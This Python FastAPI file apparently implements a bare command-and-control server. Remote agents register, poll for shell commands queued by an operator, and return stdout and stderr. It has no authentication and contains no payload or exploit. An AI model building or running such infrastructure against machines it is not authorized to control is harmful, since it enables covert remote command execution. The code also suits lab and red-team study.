from fastapi import FastAPI
from uuid import uuid4
from typing import Dict, List
from pydantic import BaseModel 
from fastapi.responses import JSONResponse


app = FastAPI()

# In-Memory storage for agents and their tasks/results
agents: Dict[str, List[Dict]] = {}
results: Dict[str, List[Dict]] = {}

# Define the structure of a command task and result using Pydantic models
class Task(BaseModel):
    task_id: str
    command: str

class Result(BaseModel):
    task_id: str
    stdout: str
    stderr: str

# APP
@app.post("/connect")
async def connect():
    """
    Enregistrement d'un nouvel agent
    """
    agent_id = str(uuid4())
    agents[agent_id] = []
    results[agent_id] = []
    print(f"[+] A new agent just registered {agent_id} [+]")
    return {"agent_id": agent_id}


@app.post("/cmd/{agent_id}")
async def get_command(agent_id: str):
    """
    Agents poll this endpoint for commands.
    Returns the next command if available, or a 'no command' status.
    """
    if agent_id not in agents:
        return JSONResponse(status_code=404)
    
    if agents[agent_id]:
        return agents[agent_id].pop(0) # Si un élément est présent on l'envoie
    return {"status":"no command"}


@app.post("/send_command/{agent_id}")
async def send_command(agent_id: str, task: Task):
    """
    Add a new command to the target agent's command queue
    """
    if agent_id not in agents:
        return JSONResponse(status_code=404)
    
    agents[agent_id].append(task.dict())
    return {"status": "command added", "task_id": task.task_id}

@app.post("/result/{agent_id}")
async def post_result(agent_id: str, result: Result):
    """
    Receives execution results from agents and stores them.
    """
    if agent_id not in agents:
        return JSONResponse(status_code=404)

    results[agent_id].append(result.dict())
    return {"status": "Result received"}

@app.get("/results/{agent_id}")
async def get_result(agent_id: str):
    """
    Fetch all results submitted by the agent
    """
    if agent_id not in agents:
        return JSONResponse(status_code=404)
    
    return results[agent_id]

@app.get("/agents")
async def list_agents():
    """
    List all currently connected agents by their IDs.
    """
    return {"agents": list(agents.keys())}

